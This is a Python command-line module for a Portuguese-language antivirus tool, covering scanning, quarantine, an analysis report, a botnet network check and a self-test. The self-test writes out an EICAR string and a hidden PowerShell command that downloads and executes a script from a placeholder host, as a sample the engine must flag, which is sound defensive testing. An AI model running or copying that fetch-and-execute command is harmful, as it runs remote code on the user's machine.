"""Modo linha de comando (sem interface) e autoteste."""
from __future__ import annotations

import argparse
import json
import os
import sys
import tempfile

from . import APP_NAME, VERSION


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="exe-antivirus", description=f"{APP_NAME} {VERSION}")
    p.add_argument("--scan", nargs="+", metavar="CAMINHO", help="verifica arquivos/pastas e sai (sem interface)")
    p.add_argument("--quick", action="store_true", help="executa um scan rápido e sai")
    p.add_argument("--quarantine", action="store_true", help="com --scan/--quick: isola as ameaças encontradas")
    p.add_argument("--analyze", metavar="ARQUIVO", help="mostra o relatório da Sala de Análise de um arquivo (JSON)")
    p.add_argument("--json", action="store_true", help="saída em JSON")
    p.add_argument("--selftest", action="store_true", help="executa o autoteste do motor e sai")
    p.add_argument("--botnet", nargs="?", const=10, type=float, metavar="SEGUNDOS",
                   help="observa a rede por alguns segundos e mostra programas com comportamento de botnet (não age)")
    p.add_argument("--minimized", action="store_true", help="inicia minimizado na bandeja")
    p.add_argument("--smoke-test", metavar="PNG", help=argparse.SUPPRESS)
    p.add_argument("--version", action="version", version=f"{APP_NAME} {VERSION}")
    return p


def _print_result(r, as_json: bool) -> None:
    if as_json:
        print(json.dumps(r.to_dict(), ensure_ascii=False))
    else:
        print(f"[{r.verdict.upper():9}] {r.score:4d} pts  {r.threat_name:40}  {r.path}")
        for i in sorted(r.indicators, key=lambda x: -x.weight)[:6]:
            print(f"              {i.weight:+4d}  {i.name}")


def run_scan(targets: list[str], quarantine: bool, as_json: bool, kind: str = "custom") -> int:
    from .engine.engine import Engine
    from .quarantine import Quarantine
    from .scanner import ScanCache, Scanner
    eng = Engine()
    q = Quarantine() if quarantine else None

    def on_threat(r):
        if q:
            try:
                q.isolate(r)
                r.action = "quarentena"
            except Exception as e:
                r.action = f"falha: {e}"
        _print_result(r, as_json)
    sc = Scanner(eng, kind, targets, on_threat=on_threat, cache=ScanCache())
    st = sc.run()
    if not as_json:
        print(f"\n{st.files} arquivo(s) verificado(s) em {st.elapsed:.1f}s · {len(st.threats)} ameaça(s) · "
              f"{st.from_cache} do cache · {st.skipped} ignorado(s)")
    return 1 if st.threats else 0


def botnet_check(seconds: float, as_json: bool) -> int:
    import time
    from .botnet import BotnetShield
    from .engine.engine import Engine
    from .quarantine import Quarantine
    sh = BotnetShield(Engine(), Quarantine(), dry_run=True, interval=1.0)
    end = time.time() + max(1.0, seconds)
    while time.time() < end:
        sh.sample()
        time.sleep(1.0)
    reps = sh.evaluate()
    if as_json:
        print(json.dumps([{"pid": r.pid, "name": r.name, "exe": r.exe, "score": r.score, "verdict": r.verdict,
                           "reasons": r.reasons(), "remote_ips": r.remote_ips[:20]} for r in reps], ensure_ascii=False))
    else:
        print(f"{sh.processes_watched} programa(s) usando a rede, {sh.connections_seen} conexão(ões) analisada(s), "
              f"{len(sh.c2.ips)} servidor(es) C2 conhecido(s)")
        for r in reps:
            print(f"[{'BOT' if r.verdict == 'malicioso' else 'SUSPEITO':8}] {r.score:4d} pts  {r.name} (PID {r.pid})  {r.exe}")
            for x in r.reasons():
                print(f"              {x}")
        if not reps:
            print("Nenhum comportamento de botnet encontrado.")
    return 1 if any(r.verdict == "malicioso" for r in reps) else 0


def selftest() -> int:
    """Verifica o motor de ponta a ponta com amostras inofensivas geradas na hora."""
    from .engine.engine import Engine
    from .engine.rules import load_builtin_dicts
    from .quarantine import Quarantine
    from .lab import AnalysisLab
    ok = True
    eng = Engine()
    eicar = bytes.fromhex(next(d for d in load_builtin_dicts() if d["id"] == "test.eicar")["all"][0][4:])
    samples = {
        "eicar": (eicar, "malicioso"),
        "ps-downloader": (b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\"", "malicioso"),
        "limpo": (b"#!/bin/sh\necho ola mundo\n", "limpo"),
    }
    with tempfile.TemporaryDirectory() as d:
        for name, (data, expected) in samples.items():
            p = os.path.join(d, f"amostra-{name}.bin")
            with open(p, "wb") as f:
                f.write(data)
            r = eng.scan_file(p).result
            good = r.verdict == expected
            ok &= good
            print(f"{'OK ' if good else 'ERRO'} {name:15} → {r.verdict} ({r.score} pts) {r.threat_name}")
        p = os.path.join(d, "amostra-eicar.bin")
        r = eng.scan_file(p).result
        q = Quarantine()
        qid = q.isolate(r)
        good = not os.path.exists(p) and q.read(qid) == eicar
        restored = q.restore(qid)
        good &= os.path.exists(restored)
        ok &= good
        print(f"{'OK ' if good else 'ERRO'} quarentena (isolar/restaurar)")
        lab = AnalysisLab(eng)
        lid = lab.add_file(restored, "selftest")
        rep = lab.report(lid)
        good = rep["verdict"] == "malicioso" and "explanation" in rep
        lab.remove(lid)
        ok &= good
        print(f"{'OK ' if good else 'ERRO'} sala de análise")
        me = sys.executable
        r = eng.scan_file(me).result
        good = r.skipped
        ok &= good
        print(f"{'OK ' if good else 'ERRO'} autoexclusão (o antivírus não verifica a si mesmo)")
    print("AUTOTESTE:", "APROVADO" if ok else "FALHOU")
    return 0 if ok else 1


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    # Executável "janela" do Windows não tem console: evita falhas ao imprimir
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w", encoding="utf-8")
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w", encoding="utf-8")
    args = build_parser().parse_args(argv)
    if args.selftest:
        return selftest()
    if args.botnet is not None:
        return botnet_check(args.botnet, args.json)
    if args.analyze:
        from .engine.engine import Engine
        from .lab import build_report
        with open(args.analyze, "rb") as f:
            data = f.read()
        rep = build_report(Engine(), data, os.path.basename(args.analyze), os.path.abspath(args.analyze))
        if args.json:
            print(json.dumps(rep, ensure_ascii=False, indent=1))
        else:
            print(rep["explanation"])
        return 0
    if args.scan:
        return run_scan(args.scan, args.quarantine, args.json)
    if args.quick:
        from .scanner import quick_targets
        return run_scan(quick_targets(), args.quarantine, args.json, "quick")
    if args.smoke_test:
        from .gui.app import smoke_test
        return smoke_test(args.smoke_test)
    from .gui.app import run
    return run([sys.argv[0]] + argv)
